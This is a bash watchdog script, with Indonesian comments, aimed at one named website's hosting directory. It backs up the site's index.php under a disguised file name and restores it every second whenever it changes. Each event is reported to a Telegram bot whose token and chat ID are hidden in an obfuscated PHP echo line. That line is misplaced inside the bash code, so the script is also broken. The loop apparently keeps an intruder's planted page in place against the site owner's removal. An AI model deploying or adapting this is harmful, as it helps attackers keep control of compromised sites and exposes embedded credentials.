#!/bin/bash

# Definisikan lokasi file index.php Permissions 755
INDEX_FILE="/data/web/virtuals/34952/virtual/www/domains/licker.cz/index.php" #<<<file directory name.php
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/data/web/virtuals/34952/virtual/www/domains/licker.cz/userdata" #<<<folder directory backup
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/system" #<<<Name file backup

# Token dan ID chat Telegram
<?php
echo "\124\117\113\105\x4e\x3d\42\x37\x39\63\x30\67\71\x36\71\x37\62\72\101\x41\x45\113\147\165\122\142\x72\146\153\117\63\117\x4b\166\115\x38\x61\x78\167\x73\x61\160\x6e\114\142\x66\x50\x70\142\67\122\x46\x51\42\xd\xa\103\x48\101\x54\137\x49\104\x3d\x22\67\x32\x33\x34\70\61\61\62\65\71\x22";

# Fungsi untuk mengirim notifikasi ke Telegram
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message"
}

# Backup file index.php jika belum ada backup
if [ ! -f "$BACKUP_FILE" ]; then
    cp "$INDEX_FILE" "$BACKUP_FILE"
    echo "Backup pertama dibuat: $BACKUP_FILE"
    send_telegram_notification "Backup pertama dibuat: $BACKUP_FILE"
fi

# Fungsi untuk memonitor perubahan pada file index.php
monitor_file() {
    while true; do
        # Hitung checksum file index.php untuk mendeteksi perubahan
        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')

        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            # Jika checksum berbeda, kembalikan file index.php dari backup
            echo "Change, mengembalikan backup..."
            cp "$BACKUP_FILE" "$INDEX_FILE"
            echo "https://www.licker.cz/" #<<<url 
            send_telegram_notification "index.php di hapus. SUDAH DI KEMBALIKAN." #<<< di hapus nama file  #<<< notic dikembalikan
        fi

        # Tunggu 1 detik sebelum pengecekan selanjutnya
        sleep 1
    done
}

#fungsi monitoring
monitor_file
